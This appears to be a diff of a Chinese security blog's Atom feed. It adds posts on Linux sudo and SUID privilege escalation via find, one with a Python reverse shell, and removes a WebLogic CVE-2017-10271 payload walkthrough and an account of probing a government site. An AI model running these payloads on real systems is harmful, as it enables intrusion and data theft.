@@ -6,7 +6,7 @@
   <link href="http://www.secice.cn/atom.xml" rel="self"/>
   
   <link href="http://www.secice.cn/"/>
-  <updated>2020-11-26T12:10:19.304Z</updated>
+  <updated>2020-11-27T07:00:52.310Z</updated>
   <id>http://www.secice.cn/</id>
   
   <author>
@@ -15,6 +15,54 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Linux提权之Sudo配置错误</title>
+    <link href="http://www.secice.cn/post/undefined"/>
+    <id>http://www.secice.cn/post/undefined</id>
+    <published>2020-11-27T06:38:09.000Z</published>
+    <updated>2020-11-27T07:00:52.310Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>如果攻击者无法通过其他任何方法直接获得root用户访问权限，则他可能会尝试损害具有SUDO访问权限的任何用户。一旦他可以访问任何sudo用户，他就可以基本上以root特权执行任何命令。</p><p>管理员可能只允许用户通过SUDO运行一些命令，可能在没有察觉的情况下中引入漏洞，这可能导致权限提升。</p><p>一个典型的例子是将SUDO权限分配给find命令，以便其他用户可以在系统中搜索特定的文件相关文件。尽管管理员可能不知道’find’命令包含用于执行命令的参数，但攻击者可以以root特权执行命令。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>拿到普通用户权限之后，使用<code>sudo –l</code>查看下， 查看当前是否存在当前用户可以调用sudo的命令，如下图，当前用户可以执行find命令，然后通过find命令获取root权限。</p><pre><code class="hljs bash">sudo /usr/bin/find /home -<span class="hljs-built_in">exec</span> /bin/bash -p \;</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSudo%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/01.jpg" alt="root"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;如果攻击者无法通过其他任何方法直接获得root用户访问权限，则他可能会尝试损害具有SUDO访问权限的任何用户。一旦他可以访问</summary>
+      
+    
+    
+    
+    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="提权" scheme="http://www.secice.cn/tags/%E6%8F%90%E6%9D%83/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux提权之Suid提权</title>
+    <link href="http://www.secice.cn/post/undefined"/>
+    <id>http://www.secice.cn/post/undefined</id>
+    <published>2020-11-27T05:44:54.000Z</published>
+    <updated>2020-11-27T06:28:02.833Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。例如，Linux ping命令通常需要root权限才能打开原始网络套接字。只要低特权用户执行suid权限程序，便会以root特权执行。</p><p>SUID是一项功能，如果使用得当，它实际上可以增强Linux的安全性。问题在于，管理员在安装第三方应用程序或进行逻辑配置更改时可能会在不知不觉中引入危险的SUID配置。</p><p>许多系统管理员不知道应该在什么情况设置SUID位，SUID位不应该设置在文件编辑器上，因为攻击者可以修改系统上存在的任何文件。</p><h2 id="常见的可用于suid提权的命令"><a href="#常见的可用于suid提权的命令" class="headerlink" title="常见的可用于suid提权的命令"></a>常见的可用于suid提权的命令</h2><pre><code class="hljs bash">NmapVimfindBashMoreLessNanocp</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用LinEnum.sh来收集要提权的机器上的信息，该脚本主要用来收集Linux上的信息。</p><p>该脚本的下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rebootuser/</span>LinEnum</code></pre><p>执行LinEnum之后，发现find这个命令有SUID权限。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/01.jpg" alt="收集信息"></p><h3 id="确认-find-有-root-执行权限"><a href="#确认-find-有-root-执行权限" class="headerlink" title="确认 find 有 root 执行权限"></a>确认 find 有 root 执行权限</h3><p>执行命令</p><pre><code class="hljs bash">touch ice/usr/bin/find ice -<span class="hljs-built_in">exec</span> whoami \;</code></pre><p>确认 find 命令是否是 root 权限执行.</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/02.jpg" alt="root"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>如果目标机上有 python 环境，可以使用 python 命令反弹 shell：</p><pre><code class="hljs bash"><span class="hljs-comment">#反弹一个sh类型的shell</span>python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></code></pre><p>结合 find :</p><pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> \;</code></pre><p>但是反弹的 shell 不是 root 权限，在本机上 find 执行 id 时，有一个 euid <code>（euid 就是我们通常说的 suid， 或者叫 excute user id，它使文件执行时拥有该文件所有者的权限。）</code>为 root 权限，但是反弹 shell 中并没有。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/03.jpg" alt="非root权限"></p><p>默认情况下 bash 在执行时，如果发现 euid 和 uid 不匹配，会将 euid（即 suid） 强制重置为uid 。如果使用了 -p 参数，则不会再覆盖。</p><p>我们尝试使用如下命令获取 shell：</p><pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> /bin/bash -p \;</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/04.jpg" alt="提权成功"></p><p>可以看到获取的 shell 为 root 权限。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。例如，Linux ping命令通常需要</summary>
+      
+    
+    
+    
+    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="提权" scheme="http://www.secice.cn/tags/%E6%8F%90%E6%9D%83/"/>
+    
+  </entry>
   
   <entry>
     <title>Linux提权之定时任务</title>
@@ -468,58 +516,6 @@
     
     
     <category term="文件包含" scheme="http://www.secice.cn/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Weblogic(CVE-2017-10271)漏洞复现 附POC</title>
-    <link href="http://www.secice.cn/post/2be8fb79"/>
-    <id>http://www.secice.cn/post/2be8fb79</id>
-    <published>2017-12-24T03:41:46.000Z</published>
-    <updated>2020-11-23T09:04:26.362Z</updated>
-    
-    <content type="html"><![CDATA[<p><code>最近的CVE-2017-10271也是引起了一个小风波，所以趁着网速好的时候下载了一个Weblogic搭建起来打算进行一次复现。</code></p><p>看了别人的漏洞复现教程 只看到了他怎么用exp怼成功，没写太明白我饶了不少弯子。</p><h4 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h4><p>CVE-2017-10271</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>Oracle WebLogic Server 10.3.6.0.0 版本<br>Oracle WebLogic Server 12.1.3.0.0 版本<br>Oracle WebLogic Server 12.2.1.1.0 版本</p><a id="more"></a><h4 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h4><p>Oracle Fusion Middleware 中的 Oracle WebLogic Server 组件的 WLS Security 子组件存<br>在安全漏洞。使用精心构造的 xml 数据可能造成任意代码执行，攻击者只需要发送精心构造<br>的 HTTP 请求，就可以拿到目标服务器的权限。攻击者可利用该漏洞控制组件，影响数据的<br>可用性、保密性和完整性。</p><h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><div class="note note-success">            <p>漏洞环境： Windows 2003 R2</p><p>漏洞版本文件：如果是土豪用户复制下面的链接</p><p><code>链接: https://pan.baidu.com/s/1hunIGTI 密码: h4qn</code></p><p>不是土豪用户那就去官方下载对应漏洞版本，不然百度云的限速，限到你怀疑人生是否被日</p><p>weblogic官网下载地址<code>http://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html</code></p>          </div><h4 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h4><p>下载完成安装方法 cmd命令：<code>cd C:\Program Files (x86)\Java\jdk1.7.0_80\bin</code> 这个目录下 执行 <code>java -jar xxx.jar（漏洞文件地址）</code> 每个人的java安装目录不一样，请自行改写。</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171224_Weblogic_CVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_%E9%99%84POC/01.png" alt="Weblogic(CVE-2017-10271)漏洞复现 附POC"></p><p>之后弹出配置界面我默认选择下一步。君随便！</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171224_Weblogic_CVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_%E9%99%84POC/05.png" alt="Weblogic(CVE-2017-10271)漏洞复现 附POC"></p><p>安装完成</p><h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>如果访问/wls-wsat/CoordinatorPortType 目录，存在下图则说明或许存在漏洞</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171224_Weblogic_CVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_%E9%99%84POC/02.png" alt="Weblogic(CVE-2017-10271)漏洞复现 附POC"></p><p><strong>1.访问我靶机地址。开启burp抓包</strong></p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">64.128</span>:<span class="hljs-number">7001</span><span class="hljs-regexp">/wls-wsat/</span>CoordinatorPortType</code></pre><p><strong>2.这是burp拦截到包是这样的</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /wls-wsat/CoordinatorPortType HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.64.128:7001</span><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">60</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3112</span>.<span class="hljs-number">113</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Cookie</span>: ADMINCONSOLESESSION=ogQg<span class="hljs-number">9</span>vh<span class="hljs-number">6</span>C<span class="hljs-number">79</span>piUJtLAFlnwm-QVVCJXULJJKsQ<span class="hljs-number">2</span>rFsLHj<span class="hljs-number">0</span>RJmHzs<span class="hljs-number">0</span>!<span class="hljs-number">1010165174</span><span class="hljs-attribute">Connection</span>: close</code></pre><p><strong>3.用下面poc替换刚刚你拦截的包，此时你的包变成下面内容。</strong></p><p>注意的是，在发送请求的时候，在请求头中必带<code>Upgrade-Insecure-Requests: 1</code>以及<code>Content-Type: text/xml</code>，否则是无法请求成功的。</p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wls-wsat/CoordinatorPortType?wsdl</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 192.168.64.128:7001<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Cookie</span>: ADMINCONSOLESESSION=EyuBou39-ST7AlyotNoPLKktqrnsuRWG--n-h57dMpb9PsSnTdav!-2052172321<span class="hljs-attribute">Connection</span>: keep-alive<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Content-Length</span>: 944&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;     &lt;soapenv:Header&gt;        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;            &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;                &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;                    &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;                        &lt;void index=&quot;0&quot;&gt;                            &lt;string&gt;cmd&lt;/string&gt;                        &lt;/void&gt;                        &lt;void index=&quot;1&quot;&gt;                            &lt;string&gt;/c&lt;/string&gt;                        &lt;/void&gt;                        &lt;void index=&quot;2&quot;&gt;                            &lt;string&gt;start xxx223 &lt;/string&gt;                        &lt;/void&gt;                    &lt;/array&gt;                &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;            &lt;/java&gt;        &lt;/work:WorkContext&gt;    &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;</code></pre><p><strong>4.发送到repeater测试（这里是使用的ProcessBuilder类进行的本地命令调用的）</strong></p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171224_Weblogic_CVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_%E9%99%84POC/03.png" alt="Weblogic(CVE-2017-10271)漏洞复现 附POC"></p><p><strong>6.看到返回信息代表成功去服务器看是不是已经添加好了；ok证明漏洞利用成功</strong></p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171224_Weblogic_CVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_%E9%99%84POC/04.png" alt="Weblogic(CVE-2017-10271)漏洞复现 附POC"></p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;&lt;code&gt;最近的CVE-2017-10271也是引起了一个小风波，所以趁着网速好的时候下载了一个Weblogic搭建起来打算进行一次复现。&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;看了别人的漏洞复现教程 只看到了他怎么用exp怼成功，没写太明白我饶了不少弯子。&lt;/p&gt;
-&lt;h4 id=&quot;漏洞编号&quot;&gt;&lt;a href=&quot;#漏洞编号&quot; class=&quot;headerlink&quot; title=&quot;漏洞编号&quot;&gt;&lt;/a&gt;漏洞编号&lt;/h4&gt;&lt;p&gt;CVE-2017-10271&lt;/p&gt;
-&lt;h4 id=&quot;影响范围&quot;&gt;&lt;a href=&quot;#影响范围&quot; class=&quot;headerlink&quot; title=&quot;影响范围&quot;&gt;&lt;/a&gt;影响范围&lt;/h4&gt;&lt;p&gt;Oracle WebLogic Server 10.3.6.0.0 版本&lt;br&gt;Oracle WebLogic Server 12.1.3.0.0 版本&lt;br&gt;Oracle WebLogic Server 12.2.1.1.0 版本&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="漏洞复现" scheme="http://www.secice.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-    
-    <category term="漏洞复现" scheme="http://www.secice.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-    <category term="Weblogic" scheme="http://www.secice.cn/tags/Weblogic/"/>
-    
-    <category term="CVE-2017-10271" scheme="http://www.secice.cn/tags/CVE-2017-10271/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>一个项目中遇到的奇葩站点</title>
-    <link href="http://www.secice.cn/post/c972a5e6"/>
-    <id>http://www.secice.cn/post/c972a5e6</id>
-    <published>2017-12-20T08:27:18.000Z</published>
-    <updated>2020-11-23T09:04:26.941Z</updated>
-    
-    <content type="html"><![CDATA[<p>在做项目的时候遇到的一个gov，因为涉及一些敏感信息，就打重马了。</p><p>其他站太难搞了，挑个软柿子捏，当看到这个首页时，直觉就告诉我这站一定有问题。</p><a id="more"></a><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/01.png" alt="一个项目中遇到的奇葩站点"></p><p>习惯性的一拿到站就查看robots文件。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/02.png" alt="一个项目中遇到的奇葩站点"></p><p>简单的看了下服务器的架构，知道是iis7.5的，于是在该文件后尝试解析漏洞。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/03.png" alt="一个项目中遇到的奇葩站点"></p><p>没有报错，从经验来看，这页面风格确实是执行php脚本的风格。</p><p>然后在随便找了个图片尝试。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/04.png" alt="一个项目中遇到的奇葩站点"></p><p>猜测是该目录没有执行脚本的权限。</p><p>这时候本来想找到个上传点上传张图片马，然后尝试拿shell。</p><p>但此时我有个大胆的想法。将asp以php的方法来执行试试。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/05.png" alt="一个项目中遇到的奇葩站点"></p><p>报错了，源码也暴露了出来，然后祭出扫描器扫了一波敏感文件，找到了其配置文件。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/06.png" alt="一个项目中遇到的奇葩站点"></p><p>就这样，数据库路径找到了，当我去访问的时候却出现了意外。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/07.png" alt="一个项目中遇到的奇葩站点"></p><p>显示404，这尼玛什么鬼。。。</p><p>继续在后面加./php尝试，奇迹又出现了。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/08.png" alt="一个项目中遇到的奇葩站点"></p><p>这里用win自带的命令将其下载下来。</p><p><code>certutil -urlcache -split -f http://www.xxx.gov.cn/xxx.mdb/.php</code></p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/09.png" alt="一个项目中遇到的奇葩站点"></p><p>将文件名修改为mdb，然后用破障打开找密码，却发现。。。。里面没密码。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/10.png" alt="一个项目中遇到的奇葩站点"></p><p>算了，利用此方法可以看到很多源代码。60个站点50个有狗，玩个锤子，有洞就不错了。这算个高危吧！！！就不继续深入了。</p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;在做项目的时候遇到的一个gov，因为涉及一些敏感信息，就打重马了。&lt;/p&gt;
-&lt;p&gt;其他站太难搞了，挑个软柿子捏，当看到这个首页时，直觉就告诉我这站一定有问题。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="原创文章" scheme="http://www.secice.cn/categories/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
-    
-    
-    <category term="渗透实战" scheme="http://www.secice.cn/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
-    
-    <category term="原创文章" scheme="http://www.secice.cn/tags/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
     
   </entry>
   
